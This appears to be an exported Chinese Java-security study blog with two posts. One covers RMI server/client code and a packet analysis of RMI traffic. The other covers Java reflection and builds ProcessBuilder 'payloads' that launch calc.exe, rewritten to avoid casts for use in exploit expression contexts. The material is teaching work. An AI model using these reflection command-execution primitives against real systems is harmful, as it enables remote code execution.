    <content><![CDATA[<p>熟悉的名字，在CVE学习中，其中<code>Apache solr</code> 的<code>log4j</code>漏洞和<code>weblogic</code>远程代码执行都提到了<code>RMI</code>，作用如名， <code>RMI（remote method invocation）</code>即<code>远程方法调用</code>。</p>
<span id="more"></span>

<h1 id="Java安全-RMI-1"><a href="#Java安全-RMI-1" class="headerlink" title="Java安全[RMI(1)]"></a>Java安全[RMI(1)]</h1><p><code>RMI</code>的目标其实和<code>RPC</code>类似，是让某个<code>Java</code>虚拟机上的对象调用另一个<code>Java</code>虚拟机上的方法，只不过<code>RMI</code>是<code>Java</code>中独有的一种机制。</p>
<blockquote>
<p><code>RPC（Remote Procedure Call）</code>是<code>远程过程调用协议</code>，是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</p>
<p>在分布式计算中，RPC允许运行于一台计算机的程序调用另一个地址空间的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程。RPC是一种<code>CS</code>模式，经典实现是一个通过<code>发送请求-接受回应</code>进行信息交互的系统。</p>
</blockquote>
<p>既然是远程调用，那么肯定是存在谁调用谁的关系，这就构成了<code>RMI Server</code>和<code>RMI Client</code>，在<code>Server</code>中实现远程调用的函数和接口，而<code>Client</code>需要知道想要调用方法的接口，然后访问执行即可。</p>
<h2 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h2><p>⼀个<code>RMI Server</code>分为三部分：</p>
<blockquote>
<ol>
<li>⼀个继承了 <code>java.rmi.Remote</code> 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 <code>hello()</code> </li>
<li>⼀个实现了此接⼝的类</li>
<li>⼀个主类，⽤来创建<code>Registry</code>，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的<code>Server</code> 了。</li>
</ol>
</blockquote>
<p>先编写一个<code>RMI Server</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">            <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>+s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下代码，</p>
<ol>
<li>接口定义</li>
</ol>
<p>先定义一个名为<code>IRemoteHelloWorld</code>的接口，它扩展了<code>Remote</code>接口，这是<code>RMI</code>中的一个标记接口。接口声明了一个<code>hello()</code>方法，该方法可以抛出<code>RemoteException</code>异常，这个接口定义了一个远程方法，客户端可以通过<code>RMI</code>调用它。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>远程对象的实现</li>
</ol>
<p>这里定义了一个名为<code>RemoteHelloWorld</code>类，实现了<code>IRemoteHelloWorld</code>接口并继承<code>UnicastRemoteObject</code>类。这个类的构造函数调用父类，也就是<code>UnicastRemoteObject</code>类的构造函数，用于创建一个远程对象。<code>RemoteHelloWorld</code>还实现了<code>hello()</code>方法，该方法奖打印一条消息<code>call from</code>，并返回<code>Hello World</code>给调用该方法的对象(如，客户端服务器)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line">        <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>+s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>启动RMI服务器方法定义和执行</li>
</ol>
<p><code>start()</code> 方法用于启动<code>RMI</code>服务器。</p>
<ul>
<li>创建一个 <code>RemoteHelloWorld</code> 实例 <code>h</code>，这个实例将充当远程对象。</li>
<li>通过 <code>LocateRegistry.createRegistry(1099)</code> 创建了一个<code>RMI</code>注册表，并指定它监听在<code>1099</code>端口上。</li>
<li>使用 <code>Naming.rebind()</code> 将远程对象 <code>h</code> 绑定到了 <code>rmi://127.0.0.1:1099/Hello</code> 这个名称下。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>main方法</li>
</ol>
<p>创建<code>RMIServer</code>的实例，并调用<code>start()</code>方法启动<code>RMIServer</code>。</p>
<h2 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h2><p>RMI客户端相比于RMI服务端的代码就简单一点，只需要访问调用服务端的远程方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://10.19.16.44:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里展示的只是本地进行调用<code>RMIServer</code>，要实现真正的<code>RMI</code>，客户端需要服务端提供接口实现方式，如上面代码所示的<code>IRemoteHelloWorld</code>，一般不会把接口和实现都包含在一个类中，而是分开多个文件，这里是为了方便。</p>
<p>客户端只需要接口打包成<code>jar</code>，这样就能知道<code>RMI</code>可以调用的方法有哪些，并知道服务端的<code>ip</code>和端口即可，然后使⽤ <code>Naming.lookup</code> 在<code>Registry</code>中寻找到名字是<code>Hello</code>的对象，后⾯的使⽤就和在本地使⽤⼀样了。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230913101103425.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913101103425.png" alt="image-20230913101103425"></a></p>
<p><code>jar</code>打包命令，这就实现了把接口打包的结果</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230913103004923.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913103004923.png" alt="image-20230913103004923"></a></p>
<p>最后在IDEA中将包加到项目结构里即可。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230917111005900.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917111005900.png" alt="image-20230917111005900"></a></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230917110908280.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917110908280.png" alt="image-20230917110908280"></a></p>
<h2 id="RMI流量分析"><a href="#RMI流量分析" class="headerlink" title="RMI流量分析"></a>RMI流量分析</h2><p>用<code>wireshark</code>抓包看看RMI的通讯数据原理</p>
<p>为了方便直观看出服务端和客户端，于是用虚拟机跑服务端，主机跑客户端，这里就不会两个ip都是一样的了</p>
<blockquote>
<p>服务端ip：<code>192.168.169.131</code></p>
<p>客户端ip：<code>192.168.126.1</code>(实际ip为<code> 10.19.16.44</code>，但是由于主机是通过虚拟机网卡访问的所以，抓虚拟机网卡的流量包时，网卡ip就是主机的)</p>
</blockquote>
<p>这里将<code>IRemoteHelloWorld</code>独立为一个文件，所以客户端代码有点不一样，服务端删不删<code>IRemoteHelloWorld</code>都一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_1;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (IRemoteHelloWorld)</span><br><span class="line">                  Naming.lookup(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230913132813979.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230913132813979.png" alt="image-20230913132813979"></a></p>
<p>抓个流量包看看，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230914162413296.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914162413296.png" alt="image-20230914162413296"></a></p>
<p>可以看到整体的过程中发生了两次tcp握手[灰色部分]，也就是在实际情况下构成了两次tcp连接。</p>
<p>第一次是从客户端的<code>19581</code>端口访问服务器的<code>1099</code>端口，第二次是客户端的<code>19584</code>端口访问<code>55947</code>端口</p>
<p>其实第一次握手很容易理解，因为我们的客户端设置的就是访问服务端的1099端口，但是为什么后面会莫名其妙访问服务端的55947端口呢</p>
<p>在流量包的<code>JRMI Return Data</code>中，也就是服务端向客户端发送的流量中可以看到，在最后的服务端ip后面的一个字节<code>\x00\x00\xda\x8b</code></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230914163214005.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914163214005.png" alt="image-20230914163214005"></a></p>
<p>通过进制转化可以看到，这个字节正好是<code>55947</code>的对应的网络序列，这也就是为什么客户端会向服务器端的<code>55947</code>端口进行tcp握手。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230914163037413.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914163037413.png" alt="image-20230914163037413"></a></p>
<p>但其实这段数据中，从<code>\xAC\xED</code>开始后，后面的所有数据都属于Java序列化的内容，其中的ip和端口只是这个对象的一部分。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230914164341663.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230914164341663.png" alt="image-20230914164341663"></a></p>
<p>其实可以简单总结一下RMI的流程，</p>
<p>首先客户端访问连接<code>Registry</code>，并在其中寻找Name名为Hello的对象，这个过程对应数据包中的<code>JRMI,Call</code>。</p>
<p>而后<code>Registry</code>向客户端发送一串反序列化字符串，代表找到了<code>Name=Hello</code>的对象，这个过程对应数据包中的<code>JRMI,ReturnData</code>。</p>
<p>客户端反序列化<code>JRMI,ReturnData</code>，发现该对象是一个远程对象，地址是<code>192.168.169.131:55947</code>，于是再与这个地址建立TCP连接，在这个新的连接中，才可以执行真正远程方法调用，也就是<code>hello()</code>。</p>
<p>可以从下图直观的认识到<code>RMI</code>中各个元素的关系。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/image-20230917102629249.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(1)]/image-20230917102629249.png" alt="image-20230917102629249"></a></p>
<p>（底下是<code>RMI</code>，单词写错了应该是<code>invocation</code>)</p>
<p>可以从先从<code>RMI Server</code>开始看，服务端先到<code>RMI Registry</code>上注册了一个Name的对象绑定关系；【如下代码，将<code>RemoteHelloWorld</code>类实例化，然后将其绑定到Hello这个Name上，这就是绑定，然后告诉<code>Registry</code>，这个对象能通过访问给定的名称进行访问】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p><code>RMI Registry</code>相当于一个网关，它本身虽然绑定了远程需要调用的对象，但是它自己是不会执行远程方法的。</p>
<p>而后是<code>RMI Client</code>，当它知道<code>Name</code>后，会向<code>RMI Registry</code>发送查询请求【如下代码，客户端这里用服务器给的对应的调用的接口<code>IRemoteHelloWorld</code>，创建对象<code>hello</code>，然后向<code>RMI Registry</code>发送想要调用的注册名字，<code>RMI Registry</code>使用这个信息来查找并返回相应的远程对象引用】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>得到远程方法的绑定关系，然后通过这个绑定关系再次连接RMI Server；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello(<span class="string">&quot;Ttoc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里<code>hello</code>就是获得了<code>RemoteHelloWorld</code>类的远程对象引用，然后用<code>hello.hello(&quot;Ttoc&quot;)</code>进行调用这个类中的<code>hello</code>方法。而这个方法的调用会通过网络发送到服务器端，服务器端会执行对应方法，并将结果返回客户端。这个过程中RMI框架起到的作用就是<code>处理网络通信，序列化，反序列化</code>等细节，使得客户端和服务器之间的通信就像是在本地方法执行一样，但是本质还是在服务器端进行的执行。</p>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[反射(3)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/</url>
    <content><![CDATA[<blockquote>
<ol>
<li><code>Java</code>执行命令的方法<code>ProcessBuilder</code> </li>
<li>反射中使用<code>getConstructor</code>获取构造有参构造函数 </li>
<li>可变长参数（<code>varargs</code>）在反射中的意义与使用 </li>
<li><code>getDeclared</code>系列反射函数和普通反射的区别于使用</li>
</ol>
</blockquote>
<p>并解决第二篇的两个问题，</p>
<blockquote>
<ul>
<li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</li>
<li>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</li>
</ul>
</blockquote>
<span id="more"></span>

<h1 id="Java安全-反射-3"><a href="#Java安全-反射-3" class="headerlink" title="Java安全[反射(3)]"></a>Java安全[反射(3)]</h1><h2 id="getConstructor反射方法-ProcessBulider执行命令"><a href="#getConstructor反射方法-ProcessBulider执行命令" class="headerlink" title="getConstructor反射方法&#x2F;ProcessBulider执行命令"></a>getConstructor反射方法&#x2F;ProcessBulider执行命令</h2><p>第一个问题</p>
<blockquote>
<p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</p>
</blockquote>
<p>我们需要用到一个新的反射方法<code>getConstructor</code>。</p>
<p>与<code>getMethod</code>类似，<code>getConstructor</code>接收参数是构造函数的列表类型。因为构造函数也支持重载，所以可能会存在多个构造函数，所以必须用参数列表类型才能唯一确认一个构造函数。</p>
<p>获取了构造函数后，使用<code>newInstance</code>来执行。</p>
<p>比如，我们常用的另一个执行命令的方式<code>ProcessBulider</code>，</p>
<blockquote>
<p>下面是一个简单的<code>ProcessBuilder</code>使用流程：</p>
<ol>
<li><p>创建一个<code>ProcessBuilder</code>实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置命令和参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pb.command(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg1&quot;</span>, <span class="string">&quot;myArg2&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>（可选）设置其他属性，如工作目录、环境变量等。</p>
</li>
<li><p>启动进程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure>
</li>
<li><p>等待进程完成并获取退出值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">exitValue</span> <span class="operator">=</span> process.waitFor();</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<p>我们使用<code>getConstructor</code>来获取其构造函数，然后调用<code>start()</code>来执行命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>这里的<code>ProcessBuilder</code>类的构造函数有两个，而且都是有参数的</p>
<blockquote>
<ul>
<li><code>public ProcessBuilder(String... command)</code></li>
<li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li>
</ul>
</blockquote>
<p>这里用到的是第二个构造函数，也可以看到构造函数的参数就是<code>command</code>，也就是执行的命令需要在实例化的时候传入。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909132658712.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909132658712.png" alt="image-20230909132658712"></a></p>
<blockquote>
<p><code>List.class</code>和之前 前两篇提到的<code>String.class</code>一样，指的是<code>调用方法的参数类型</code>。</p>
<p><code>List.class</code>指的就算<code>List接口类</code>的<code>Class</code>对象</p>
<p><code>String.class</code>表示 <code>String</code>类的<code>Class</code>对象</p>
</blockquote>
<blockquote>
<p>在这段代码中，<code>List.class</code> 被用作参数传递给 <code>getConstructor()</code> 方法，以获取一个接受 <code>List</code> 类型参数的构造函数。这意味着我们<strong>正在查找一个构造函数</strong>，它接受一个 <code>List</code> 对象作为参数，并使用该 <code>List</code> 对象来初始化新创建的 <code>ProcessBuilder</code> 实例。于是就找到了第二个构造函数，这样，我们就可以动态地创建并启动一个新进程。</p>
</blockquote>
<hr>
<h2 id="避免利用强类型转换"><a href="#避免利用强类型转换" class="headerlink" title="避免利用强类型转换"></a>避免利用强类型转换</h2><p>但是我们在<code>payload</code>中用到了Java中的强类型转换【<code>((ProcessBuilder) xxx)</code>】，有时候我们利用漏洞的时候(在表达式上下文)是没有这种语法的。所以我们仍然需要反射来完成这一步。</p>
<blockquote>
<p>其中有个<code>Arrays.asList</code>其实也好理解，就算将参数从数组转换为列表，使其符合构造函数的参数类型，然后<code>newInstance</code>时将参数传进去执行。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>



<p>其实也很好改这个<code>payload</code>，这里需要用到强类型转化的原因主要是因为执行<code>.start()</code>方法<code>启动进程</code>的时候，前部分不用强类型包含起来，无法找到这个方法，会在<code>Object</code>类中寻找。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909150718667.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909150718667.png" alt="image-20230909150718667"></a></p>
<p>这里可以直接用反射中<code>getMethod</code>方法获取<code>start</code>方法，就可以避免这种问题，然后<code>invoke</code>执行，因为<code>start</code>的是一个普通方法，所以<code>invoke</code>的第一个参数就是<code>ProcessBuilder</code>类实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909151721671.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909151721671.png" alt="image-20230909151721671"></a></p>
<p>执行结果，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909152513387.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909152513387.png" alt="image-20230909152513387"></a></p>
<hr>
<h2 id="可变长参数（varargs）在反射中的意义与使用"><a href="#可变长参数（varargs）在反射中的意义与使用" class="headerlink" title="可变长参数（varargs）在反射中的意义与使用"></a>可变长参数（varargs）在反射中的意义与使用</h2><p>那么，如果想要用<code>ProcessBuilder</code>的第一个构造函数，又应该怎么实现反射呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span></span><br></pre></td></tr></table></figure>

<p>这里涉及到Java的变长参数了，和其他语言一样，Java中也支持可变长参数，就算当你在定义函数时，在设置参数时，不确定参数的个数时，可以用 <code>...</code> 来表示这个函数的参数个数是可以变的。其实就是和数组差不多的含义。</p>
<p>而且实际上，对于<code>变长参数</code>，Java在编译的时候会编译成一个<code>一维数组</code>，也就是说，对于如下两段代码在底层上是一致的，也就是说无法重载，见下图可知。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String... names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909154214840.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909154214840.png" alt="image-20230909154214840"></a></p>
<p>也就是说，如果有个数组，想传给<code>hello</code>函数，直接传入数组即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure>

<p>所以，我们将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>，就可以查找获取<code>ProcessBuilder</code>的第二种构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBulider&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br></pre></td></tr></table></figure>

<p>但是在通过<code>newInstance</code>传参时，就有不同了，因为<code>ProcessBulider</code>的第一个构造函数的参数是变长参数，也就是一维数组，而<code>newInstance</code>的参数也是变长参数，同样也是一维数组，如下图，所以想通过如果想传参成功，就是一个一维数组中元素为一维数组 &#x3D;&#x3D;&gt; 也就是二维数组。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230909220933269.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909220933269.png" alt="image-20230909220933269"></a></p>
<p>于是构造payload如下，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">       ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>这样的话，我们想要传给构造函数的参数，也就是一维数组，就被当作传给<code>newInstance</code>的二维数组的元素形式，传给了构造函数。</p>
<p>这里可能会产生一个疑惑，不是<code>newInstance</code>也是接收一个一维数组吗，为什么这里可以是二维数组，但是实际上这里的二维数组起的作用也只是一个一维数组，因为它的元素只能有一个一维数组。</p>
<p>如下，将二维数组中加入两个一维数组元素后，发生报错，期待的参数只有一个，但是却传入了两个，说明这里<code>本质还是需要一个一维数组</code>。</p>
